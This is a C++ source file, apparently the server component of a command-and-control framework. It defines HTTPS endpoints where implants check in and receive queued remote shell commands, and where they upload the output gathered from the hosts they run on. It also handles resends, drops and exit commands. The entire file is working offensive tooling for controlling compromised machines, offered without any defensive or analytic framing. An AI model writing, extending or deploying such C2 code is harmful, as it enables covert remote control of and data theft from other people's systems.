#include "beaconEndpoints.hpp"

#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <new>
#include <string>

#include "frame.h"
#include "serverOutput.hpp"
#include "sessionStore.hpp"

namespace
{
constexpr const char *kBinaryType = "application/octet-stream";

// Bridge the shared C codec to the std::string httplib sends. The wire rules
// live in frame.c; only the buffer ownership is handled here.
std::string encode_frame(std::uint32_t session_id, std::uint32_t command_id,
                         const std::string &payload)
{
    std::size_t len = 0;
    char *frame =
        frame_encode(session_id, command_id, payload.data(), payload.size(), &len);
    if (frame == nullptr)
        throw std::bad_alloc();

    std::string body(frame, len);
    std::free(frame);
    return body;
}

// Answer one check-in: record the session, then hand over its next queued
// command, or 204 when the queue is empty.
void serve_next_command(SessionStore &store, std::uint32_t id,
                        httplib::Response &res)
{
    store.check_in(id);

    std::string command;
    const Pending pending = store.take(id, command);

    if (pending == Pending::Exit)
    {
        res.set_content(encode_frame(id, CMD_EXIT, std::string()), kBinaryType);
        return;
    }
    if (pending == Pending::Dropped)
    {
        write_message("[!] " + hex_id(id) + ": dropped `" + command +
                      "`, no result after repeated sends");
        res.status = 204;
        return;
    }
    if (pending == Pending::None)
    {
        res.status = 204;
        return;
    }

    // A check-in that arrives while a command is unanswered means its result
    // upload never landed, so the command is sent again rather than lost.
    if (pending == Pending::Resend)
        write_message("[!] " + hex_id(id) + ": no result for `" + command +
                      "`, sending it again");

    // Keep payload_size truthful before it is cast.
    if (command.size() > kMaxPayload)
    {
        // It can never fit, so drop it instead of resending it forever.
        (void)store.acknowledge(id);
        res.status = 413;
        return;
    }
    res.set_content(encode_frame(id, CMD_EXECUTE_SHELL, command), kBinaryType);
}

// Show the output the implant collected, labelled with the command it answers.
// The store serves one command at a time, so the in-flight entry is that one.
void report_result(SessionStore &store, const C2_HEADER &header,
                   const std::string &body)
{
    const std::string command = store.acknowledge(header.session_id);

    std::string message = "[+] result from " + hex_id(header.session_id);
    if (!command.empty())
        message += " for `" + command + "`";
    message += " (" + std::to_string(header.payload_size) + " bytes):\n";
    message += escape_control(
        std::string(frame_payload(body.data()),
                    static_cast<std::size_t>(header.payload_size)));
    write_message(message);
}
} // namespace

void register_all_beacon_endpoints(httplib::SSLServer &server,
                                   SessionStore &store)
{
    // Implant check-in. The session id the frame carries is the only thing that
    // says which queue to serve, so the body is parsed rather than ignored.
    server.Post(C2_PATH_CHECKIN,
                [&store](const httplib::Request &req, httplib::Response &res) {
                    C2_HEADER header{};
                    if (!frame_decode(req.body.data(), req.body.size(), &header))
                    {
                        res.status = 400;
                        return;
                    }

                    serve_next_command(store, header.session_id, res);
                });

    // Result upload: acknowledge the command that produced it and print the
    // output. Deliberately does not register a session, so an upload cannot
    // create one.
    server.Post(C2_PATH_RESULT,
                [&store](const httplib::Request &req, httplib::Response &res) {
                    C2_HEADER header{};
                    if (!frame_decode(req.body.data(), req.body.size(), &header))
                    {
                        res.status = 400;
                        return;
                    }
                    if (header.payload_size > kMaxPayload)
                    {
                        res.status = 413;
                        return;
                    }

                    report_result(store, header, req.body);
                    res.status = 200;
                });
}
